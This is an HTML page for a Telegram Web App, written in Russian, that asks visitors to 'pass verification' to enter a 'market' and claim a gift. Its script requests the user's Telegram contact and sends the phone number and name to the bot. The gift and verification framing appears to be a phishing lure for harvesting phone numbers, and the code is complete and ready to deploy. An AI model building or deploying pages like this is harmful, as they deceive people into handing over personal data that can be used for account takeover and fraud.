<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Верификация</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      background: #0f1117;
      color: #e2e8f0;
      font-family: 'Inter', system-ui, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
    }

    .card {
      background: #161b22;
      border-radius: 20px;
      padding: 2.5rem 2rem;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
      border: 1px solid #2d3748;
      text-align: center;
    }

    .title {
      font-size: 1.8rem;
      font-weight: 600;
      margin-bottom: 0.75rem;
      color: #e2e8f0;
    }

    .subtitle {
      font-size: 1.05rem;
      line-height: 1.5;
      color: #94a3b8;
      margin-bottom: 2.5rem;
    }

    .btn {
      background: linear-gradient(135deg, #3b82f6, #6366f1);
      color: white;
      border: none;
      padding: 1.1rem 2.5rem;
      font-size: 1.1rem;
      font-weight: 600;
      border-radius: 14px;
      cursor: pointer;
      transition: all 0.3s ease;
      width: 100%;
      max-width: 280px;
      margin: 0 auto;
      display: block;
      box-shadow: 0 8px 25px rgba(59, 130, 246, 0.35);
    }

    .btn:hover {
      background: linear-gradient(135deg, #60a5fa, #818cf8);
      transform: translateY(-3px);
      box-shadow: 0 12px 35px rgba(59, 130, 246, 0.5);
    }

    .info {
      margin-top: 2rem;
      font-size: 0.9rem;
      color: #64748b;
      line-height: 1.6;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="title">Для входа в маркет</div>
    <div class="subtitle">пройдите верификацию</div>

    <button class="btn" id="grant">Поделиться номером</button>

    <div class="info">
      Это нужно для подтверждения получения подарка<br>
      Ваш номер виден только боту и не передаётся третьим лицам
    </div>
  </div>

  <script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const btn = document.getElementById('grant');

    btn.onclick = async () => {
      btn.disabled = true;
      btn.innerHTML = 'Подтверждаем...';

      try {
        const contact = await tg.requestContact();
        tg.sendData(JSON.stringify({
          contact: {
            phone_number: contact.phone_number,
            first_name: contact.first_name,
            last_name: contact.last_name || ''
          }
        }));
        tg.close();
      } catch (e) {
        tg.sendData(JSON.stringify({ error: e.message || 'denied' }));
        btn.disabled = false;
        btn.innerHTML = 'Поделиться номером';
      }
    };
  </script>
</body>
</html>
